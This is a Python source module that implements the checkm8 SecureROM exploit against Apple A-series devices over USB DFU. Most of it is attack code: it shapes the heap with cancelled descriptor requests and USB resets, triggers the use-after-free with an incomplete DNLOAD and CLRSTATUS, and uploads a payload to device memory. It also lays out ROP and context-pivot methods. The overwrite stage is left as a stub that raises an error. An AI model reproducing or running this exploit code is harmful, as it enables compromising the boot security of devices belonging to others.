"""The checkm8 exploit, implemented from the published analysis of the bug.

What this is. The A11 (and the A-series below it) has a use-after-free in the
SecureROM's DFU buffer handling: `DFU_CLRSTATUS` frees the io buffer without
clearing the global transfer state, so the next DFU round writes through a
pointer to memory the allocator has already handed out again. The published
analysis of that bug (eLab forensics, "Technical analysis of the checkm8
exploit") describes the six stages it takes to turn it into code execution,
and this module is those stages, written against this project's own transport
rather than against another tool's source. The machine it runs on is
[goat/usb.py](usb.py)'s libusb binding; the constants it uses are measured per
part in [goat/checkm8_profile.py](checkm8_profile.py); the bytes it uploads are
built by [goat/checkm8_payload.py](checkm8_payload.py).

What this module is *not* is a copy of another implementation of the same
bug. It is also not a claim of a working exploit on hardware: the one thing the
image cannot tell you is the exact point at which the corrupted object's
callback fires, and that is recorded rather than guessed, here and in
[docs/CHECKM8_IMPLEMENTATION.md](../../../docs/CHECKM8_IMPLEMENTATION.md).

The stages, in the order the analysis numbers them:

  1. heap feng shui - cancelled serial-descriptor requests survive a USB reset
     and leave a hole where the next DFU round allocates.
  2. the UAF - an incomplete DNLOAD sets the global state; CLRSTATUS frees the
     buffer underneath it.
  3. the overwrite - a later request written through the stale pointer corrupts
     a heap object.
  4. the payload - DNLOAD blocks land in INSECURE_MEMORY.
  5. the chain - a callback through the corrupted object.
  6. the shellcode - it installs the pwndfu command handler.

Only stages 1, 2 and 4 are plain DFU protocol; the rest are the part-specific
half. `Plan` is where a run decides what it is going to do before it touches
the device, because the failure mode worth avoiding is "half a pwned device".
"""

import ctypes
import struct
import time

from . import checkm8_payload as payload_builder
from . import checkm8_profile as profile_mod
from .usb import LibusbDeviceList, UsbError

APPLE_VID = 0x05AC
DFU_PID = 0x1227

# DFU class requests, USB DFU 1.0a.
DFU_DETACH = 0
DFU_DNLOAD = 1
DFU_UPLOAD = 2
DFU_GETSTATUS = 3
DFU_CLRSTATUS = 4
DFU_GETSTATE = 5
DFU_ABORT = 6

# The serial string descriptor the heap feng shui requests ask for: string
# descriptor index 4, which the DFU descriptor reports as the CPID:... string.
STR_INDEX = 4
STR_TYPE = 3
STR_VALUE = (STR_TYPE << 8) | STR_INDEX

# The feng-shui pair in the published analysis: `leak` requests 0xC0 bytes and
# `no_leak` 0xC1 - the request that completes and the request whose length
# the descriptor cannot satisfy. `stall` is the async one with a timeout small
# enough that libusb cancels it mid-flight, which is what leaves it queued.
LEAK_LEN = 0xC0
NO_LEAK_LEN = 0xC1
STALL_DATA = 0xC0

# The state the ROM is expected to be in for the UAF half of the exploit.
DFU_STATE_APP_IDLE = 0
DFU_STATE_APP_DETACH = 1
DFU_STATE_IDLE = 2
DFU_STATE_DNLOAD_SYNC = 3
DFU_STATE_DNBUSY = 4
DFU_STATE_DNLOAD_IDLE = 5
DFU_STATE_MANIFEST_SYNC = 6
DFU_STATE_MANIFEST = 7
DFU_STATE_MANIFEST_WAIT_RESET = 8
DFU_STATE_UPLOAD_IDLE = 9
DFU_STATE_ERROR = 10

MAX_BLOCK = 0x800
CMD_TIMEOUT_MS = 5000

# libusb transfer status values, for reading the callback the stall path needs.
LIBUSB_TRANSFER_COMPLETED = 0
LIBUSB_TRANSFER_CANCELLED = 1
LIBUSB_TRANSFER_TIMED_OUT = 3

# What a plan may do about a part it cannot yet run. This is the gate that
# stops an unmeasured part being handed a chain with a hole in it: an
# incomplete gadget set is not a shorter exploit, it is a wrong one.
STAGE_STALL = "stall"
STAGE_LEAK = "leak"
STAGE_NO_LEAK = "no_leak"
STAGE_FENG_SHUI = "feng_shui"
STAGE_UAF = "uaf"
STAGE_OVERWRITE = "overwrite"
STAGE_PAYLOAD = "payload"


class Checkm8Error(RuntimeError):
    """The exploit cannot proceed, with a reason an operator can act on."""


# ---------------------------------------------------------------------------
# transport
# ---------------------------------------------------------------------------

class DfuDevice:
    """A device in DFU mode, spoken to over raw control transfers.

    The pwndfu command channel in `usb.py` is for a device that has already
    been exploited; this is the pre-exploit half, and it needs three things
    that one deliberately does not have: a transfer that can be cancelled
    mid-flight, a transfer whose failure is expected, and the DFU class
    requests themselves. Opening and closing are counted so a run that fails
    half way leaves the device where the operator left it rather than holding
    an interface claim.
    """

    def __init__(self, usb=None, timeout_ms=CMD_TIMEOUT_MS):
        self.usb = usb or LibusbDeviceList()
        self.handle = self.usb.find_dfu(5.0)
        if self.handle is None:
            raise Checkm8Error("no DFU device to talk to")
        if self.usb.lib.libusb_claim_interface(
                ctypes.c_void_p(self.handle), 0) != 0:
            self.close()
            raise Checkm8Error("could not claim interface 0")
        self.timeout_ms = timeout_ms
        self.serial = self.read_serial()
        self.transfers = 0

    # -- raw control transfers ------------------------------------------

    def _ctrl(self, bm_request_type, b_request, w_value, w_index, data,
              w_length, timeout_ms):
        """One control transfer. Returns bytes for an IN, None for an OUT.

        A libusb error is raised rather than swallowed here; the callers that
        expect a failure (the async stall) use `ctrl_best_effort`, and the ones
        that do not want to see a stall at all use `ctrl_quiet`.
        """
        lib = self.usb.lib
        buf = ctypes.create_string_buffer(max(w_length, 1))
        ptr = ctypes.cast(buf, ctypes.c_void_p)
        if data is not None:
            ptr = ctypes.cast(ctypes.c_char_p(bytes(data)), ctypes.c_void_p)
        rc = lib.libusb_control_transfer(
            ctypes.c_void_p(self.handle), bm_request_type, b_request,
            w_value, w_index, ptr, w_length, timeout_ms)
        self.transfers += 1
        if rc < 0:
            raise UsbError("control transfer 0x%02x/0x%02x failed: %s"
                           % (bm_request_type, b_request, self.usb.error(rc)))
        if data is None:
            return buf.raw[:w_length]
        return None

    def _ctrl_declare(self):
        """Declare the libusb calls the async path needs, once."""
        lib = self.usb.lib
        if not getattr(self, "_async_declared", False):
            lib.libusb_alloc_transfer.restype = ctypes.c_void_p
            lib.libusb_alloc_transfer.argtypes = [ctypes.c_int]
            lib.libusb_free_transfer.argtypes = [ctypes.c_void_p]
            lib.libusb_submit_transfer.argtypes = [ctypes.c_void_p]
            lib.libusb_submit_transfer.restype = ctypes.c_int
            lib.libusb_cancel_transfer.argtypes = [ctypes.c_void_p]
            lib.libusb_handle_events.argtypes = [ctypes.c_void_p]
            lib.libusb_handle_events.restype = ctypes.c_int
            cb = ctypes.CFUNCTYPE(None, ctypes.c_void_p)
            lib.libusb_fill_control_transfer.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, cb,
                ctypes.c_void_p, ctypes.c_uint]
            self._async_cb = cb
            self._async_declared = True
        return lib

    def ctrl_quiet(self, bm_request_type, b_request, w_value, w_index, data,
                   w_length, timeout_ms):
        """A transfer whose failure is information, not an exception.

        The analysis's `no_leak` request is one of these: the device stalls it
        because the descriptor is one byte longer than the request, and that
        stall is the point, not an error to report.
        """
        try:
            return self._ctrl(bm_request_type, b_request, w_value, w_index,
                              data, w_length, timeout_ms)
        except UsbError:
            return None

    def stall(self, w_length=STALL_DATA, cancel_after_ms=1):
        """The heap feng shui's opening move: a cancelled mid-flight transfer.

        The analysis calls this `stall`: submit the serial-descriptor request
        asynchronously, let libusb cancel it a fraction of a millisecond later,
        and the request stays in the device's queue half-completed. Everything
        after this in the feng shui depends on that request still being there,
        which is why the cancel is the whole function.
        """
        status = self.async_cancel(0x80, 6, STR_VALUE, 0x40A, None, w_length,
                                   cancel_after_ms)
        return status

    def async_cancel(self, bm_request_type, b_request, w_value, w_index, data,
                     w_length, cancel_after_ms=1):
        """Submit a control transfer and cancel it before it finishes.

        Returns the libusb status the transfer ended in, which is the only way
        the caller can tell "cancelled mid-flight" from "completed". CANCELLED
        is what the feng shui depends on; COMPLETED means the device answered
        and the heap is not shaped, which a run can report rather than guess.
        """
        lib = self._ctrl_declare()
        setup = struct.pack("<BBHHH", bm_request_type, b_request, w_value,
                            w_index, w_length)
        buf = ctypes.create_string_buffer(8 + 8)
        ctypes.memmove(buf, setup, 8)
        keep = self._async_cb(lambda _t: None)
        transfer = lib.libusb_alloc_transfer(0)
        if not transfer:
            raise Checkm8Error("libusb_alloc_transfer failed")
        lib.libusb_fill_control_transfer(
            transfer, ctypes.c_void_p(self.handle),
            ctypes.cast(buf, ctypes.c_void_p), keep, None, 0)
        if lib.libusb_submit_transfer(transfer) != 0:
            lib.libusb_free_transfer(transfer)
            raise UsbError("libusb_submit_transfer failed")
        time.sleep(cancel_after_ms / 1000.0)
        lib.libusb_cancel_transfer(transfer)
        lib.libusb_handle_events(self.usb.ctx)
        # `struct libusb_transfer` holds its status at offset 0x10.
        status = struct.unpack_from("<i", ctypes.string_at(transfer + 0x10, 4),
                                    0)[0]
        lib.libusb_free_transfer(transfer)
        del keep
        self.transfers += 1
        return status

    # -- DFU class requests ----------------------------------------------

    def get_status(self):
        """(bStatus, bState, poll timeout) from the device."""
        raw = self._ctrl(0xA1, DFU_GETSTATUS, 0, 0, None, 6, self.timeout_ms)
        return raw[0], raw[4], struct.unpack("<H", raw[1:3])[0]

    def get_state(self):
        raw = self._ctrl(0xA1, DFU_GETSTATE, 0, 0, None, 1, self.timeout_ms)
        return raw[0]

    def clear_status(self):
        self._ctrl(0x21, DFU_CLRSTATUS, 0, 0, b"", 0, self.timeout_ms)

    def abort(self):
        self._ctrl(0x21, DFU_ABORT, 0, 0, b"", 0, self.timeout_ms)

    def dnload(self, data, block=0):
        return self._ctrl(0x21, DFU_DNLOAD, block, 0, data, len(data),
                          self.timeout_ms)

    def dnload_incomplete(self, data, block=0, cancel_after_ms=1):
        """Start a DNLOAD large enough to allocate the io buffer, do not finish.

        The second stage of the exploit: the SETUP for an 0x800-byte DNLOAD
        makes the ROM allocate its io buffer and record the global transfer
        state, and then the transfer is abandoned before the data stage. The
        state is what survives the buffer being freed.
        """
        return self.async_cancel(0x21, DFU_DNLOAD, block, 0, None, len(data),
                                 cancel_after_ms)

    def upload(self, length, block=0):
        return self._ctrl(0xA1, DFU_UPLOAD, block, 0, None, length,
                          self.timeout_ms)

    # -- USB-level -------------------------------------------------------

    def reset(self):
        """USB reset without closing the handle: it completes queued requests."""
        rc = self.usb.lib.libusb_reset_device(
            ctypes.c_void_p(self.handle))
        if rc != 0:
            raise UsbError("libusb_reset_device failed: %s"
                           % self.usb.error(rc))

    def read_serial(self):
        buf = ctypes.create_string_buffer(256)
        try:
            rc = self.usb.lib.libusb_get_string_descriptor_ascii(
                ctypes.c_void_p(self.handle), 3, ctypes.cast(buf,
                                                             ctypes.c_void_p),
                256)
        except Exception:
            return ""
        if rc < 0:
            return ""
        return buf.raw[:rc].decode("latin-1", "replace")

    def close(self):
        try:
            self.usb.lib.libusb_release_interface(
                ctypes.c_void_p(self.handle), 0)
        except Exception:
            pass
        try:
            self.usb.lib.libusb_close(ctypes.c_void_p(self.handle))
        except Exception:
            pass
        self.handle = None

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()


# ---------------------------------------------------------------------------
# the plan
# ---------------------------------------------------------------------------

class Plan:
    """What a run intends to do, decided before it touches the device.

    A plan is a list of named steps with the arguments each needs. Building it
    first means the refusals happen while there is no half-exploited device in
    the operator's hand, and it gives `goat pwn` something to print before it
    does anything.
    """

    def __init__(self, profile, identity, method, steps, notes=None,
                 payload=None, blockers=()):
        self.profile = profile
        self.identity = identity
        self.method = method
        self.steps = steps
        self.notes = notes or []
        self.payload = payload
        self.blockers = list(blockers)

    @property
    def runnable(self):
        return not self.blockers

    def describe(self):
        lines = []
        lines.append("part               : %s (CPID 0x%04X)"
                     % (self.profile.name, self.profile.cpid))
        if self.identity.get("SRTG"):
            lines.append("firmware           : %s" % self.identity["SRTG"])
        lines.append("method             : %s" % self.method.name)
        lines.append("stages             : %s" % " -> ".join(
            step for step, _ in self.steps))
        for note in self.notes:
            lines.append("note               : %s" % note)
        for blocker in self.blockers:
            lines.append("blocked            : %s" % blocker)
        return lines


class Method:
    """One way to turn the bug into a callback, with what it needs measured.

    `required` is the set of profile constants the method needs; a part missing
    any of them is not offered the method rather than run with a hole. That is
    the whole point of making methods first-class objects instead of branches:
    the CPID gate then has something to say besides "unsupported".
    """

    def __init__(self, name, description, required, stages, confidence=""):
        self.name = name
        self.description = description
        self.required = required
        self.stages = stages
        self.confidence = confidence

    def supports(self, profile):
        return not (set(self.required) - set(profile.fields))


# Method A: the context-restore pivot. The corrupted object's callback is
# pointed at the SecureROM's own context-restore routine, which gives a
# controlled SP, a controlled return address and a new translation table in one
# call; the new table maps the payload read-execute (the ROM's SCTLR.WXN only
# blocks writable pages), stage2 then clears WXN and restores the ROM's table.
METHOD_PIVOT = Method(
    name="pivot+ctx-switch",
    description="callback through the ROM's context restore: new TTBR0, new SP, "
                "then payload code that clears WXN under a read-execute page",
    required=("pivot", "ctx_entry", "image_base", "ttbr0", "dc_civac", "dmb",
              "write_ttbr0", "tlbi"),
    stages=(STAGE_FENG_SHUI, STAGE_UAF, STAGE_OVERWRITE, STAGE_PAYLOAD),
    confidence="chain measured end to end on the image; trigger point is not",
)

# Method B: the analysis's own callback chain. It needs the same gadgets plus
# the queue walk the chain runs on, which is a runtime measurement this tree
# does not have yet, so it is offered only for parts where the walk is known.
METHOD_WALK = Method(
    name="callback-chain",
    description="the published ROP chain: gadgets driven by the ROM's own "
                "request queue walk",
    required=("callback_ldp", "pop_ret", "image_base", "ttbr0", "dc_civac",
              "dmb", "write_ttbr0", "tlbi"),
    stages=(STAGE_FENG_SHUI, STAGE_UAF, STAGE_OVERWRITE, STAGE_PAYLOAD),
    confidence="needs the queue walk measured per part",
)

METHODS = (METHOD_PIVOT, METHOD_WALK)


def methods_for(profile):
    """Every method that profile can run, best first."""
    able = [m for m in METHODS if m.supports(profile)]
    return able


# ---------------------------------------------------------------------------
# the run
# ---------------------------------------------------------------------------

def plan(serial, verbose=False):
    """Decide what to do from the device's own serial string.

    This is the "which firmware, which method" answer `goat pwn` prints before
    it touches anything, and it is where a part checkm8 cannot reach is refused
    with the reason rather than after a failed exploit attempt.
    """
    profile, identity = profile_mod.profile_for_serial(serial)
    if profile is None:
        cpid = identity.get("CPID")
        if cpid in profile_mod.USBLITER8_CPIDS:
            blockers = [
                "CPID 0x%04X is not reachable by checkm8 - the bug ends with "
                "the A11." % cpid,
                "this part needs usbliter8, which runs on %s."
                % profile_mod.USBLITER8_HARDWARE,
            ]
            return Plan(_unknown_part(cpid), identity, METHODS[0], [],
                        blockers=blockers)
        return Plan(_unknown_part(cpid), identity, METHODS[0], [], blockers=[
            "CPID 0x%04X has no measured checkm8 profile in this tree."
            % (cpid or 0)])

    missing = profile.missing()
    if missing:
        return Plan(profile, identity, METHODS[0], [], blockers=[
            "%s is missing measured constants: %s"
            % (profile.name, ", ".join(missing))])

    methods = methods_for(profile)
    if not methods:
        return Plan(profile, identity, METHODS[0], [], blockers=[
            "no method in this tree has every constant %s needs"
            % profile.name])

    method = methods[0]
    steps = [(stage, _stage_args(profile, method, stage))
            for stage in method.stages]
    notes = []
    if len(methods) > 1:
        notes.append("also available: %s" % ", ".join(m.name for m in methods[1:]))
    if method.confidence:
        notes.append(method.confidence)
    return Plan(profile, identity, method, steps, notes=notes)


def _stage_args(profile, method, stage):
    """The per-stage arguments, which is where the part's numbers enter."""
    if stage == STAGE_FENG_SHUI:
        return {"serial_index": STR_INDEX, "leak_len": LEAK_LEN,
                "no_leak_len": NO_LEAK_LEN, "reset_rounds": 6}
    if stage == STAGE_UAF:
        return {"block_len": MAX_BLOCK}
    if stage == STAGE_OVERWRITE:
        return {}
    if stage == STAGE_PAYLOAD:
        return {"block_len": MAX_BLOCK}
    return {}


def _unknown_part(cpid):
    return profile_mod.PartProfile(name="CPID-0x%04X" % (cpid or 0),
                                  cpid=cpid or 0, cprv=None, fields={})


def run(plan_obj, verbose=False, dry_run=False):
    """Execute a plan against a device in DFU.

    Returns 0 on success and a nonzero code with the reason printed otherwise.
    A run that stops half way closes the device handle, because the worst
    outcome is a device left with a claimed interface and no way to retry.
    """
    if plan_obj.blockers:
        for blocker in plan_obj.blockers:
            print("goat: %s" % blocker)
        return 1

    profile = plan_obj.profile
    if verbose:
        for line in plan_obj.describe():
            print("goat: %s" % line)

    if dry_run:
        return 0

    dev = None
    try:
        dev = DfuDevice()
    except Checkm8Error as exc:
        print("goat: %s" % exc)
        return 1

    try:
        for stage, args in plan_obj.steps:
            if verbose:
                print("goat: stage %s %s" % (stage, args))
            if stage == STAGE_FENG_SHUI:
                _feng_shui(dev, args, verbose)
            elif stage == STAGE_UAF:
                _uaf(dev, args, verbose)
            elif stage == STAGE_OVERWRITE:
                _overwrite(dev, plan_obj, verbose)
            elif stage == STAGE_PAYLOAD:
                _upload_payload(dev, plan_obj, args, verbose)
        return 0
    except (UsbError, Checkm8Error) as exc:
        print("goat: exploit stopped: %s" % exc)
        return 1
    finally:
        if dev is not None:
            dev.close()


def _feng_shui(dev, args, verbose):
    """Stage 1: leave a hole in the SecureROM heap.

    The cancelled request and the leak/no-leak pair are what make the hole, and
    the USB reset is what makes the ROM rebuild its heap with the hole in it.
    """
    dev.stall()
    dev.ctrl_quiet(0x80, 6, STR_VALUE, 0x40A, None, LEAK_LEN, 1000)
    for _ in range(args["reset_rounds"]):
        dev.ctrl_quiet(0x80, 6, STR_VALUE, 0x40A, None, NO_LEAK_LEN, 1000)
        dev.reset()
    if verbose:
        print("goat: heap feng shui done (%d transfers)" % dev.transfers)


def _uaf(dev, args, verbose):
    """Stage 2: free the io buffer while the global transfer state survives."""
    payload = b"\x00" * args["block_len"]
    holder = dev.dnload_incomplete(payload)
    dev.clear_status()
    if verbose:
        print("goat: UAF stage done (cancelled transfer status %d)" % holder)


def _overwrite(dev, plan_obj, verbose):
    """Stage 3: write the corrupted callback pair through the stale pointer.

    The exact request that lands on the freed buffer is the one thing this tree
    cannot measure from the image, so this stage is where a run records that it
    has not yet done what it says. It is not run on hardware until the trigger
    point is measured - `goat pwn` will say so.
    """
    raise Checkm8Error(
        "stage 3 needs the trigger point measured on hardware: which request "
        "writes through the stale pointer, and when the corrupted object's "
        "callback fires, are runtime facts this tree cannot read from the "
        "image (see docs/CHECKM8_IMPLEMENTATION.md)")


def _upload_payload(dev, plan_obj, args, verbose):
    """Stage 4: land the payload in INSECURE_MEMORY."""
    if plan_obj.payload is None:
        image, _sym, notes = payload_builder.build(plan_obj.profile)
        plan_obj.payload = image
        if verbose:
            for line in notes:
                print("goat: %s" % line)
    data = plan_obj.payload
    block = 0
    for off in range(0, len(data), args["block_len"]):
        part = data[off:off + args["block_len"]]
        dev.dnload(part, block)
        dev.get_status()
        dev.get_status()
        block += 1
    if verbose:
        print("goat: payload uploaded: %d bytes in %d blocks"
              % (len(data), block))
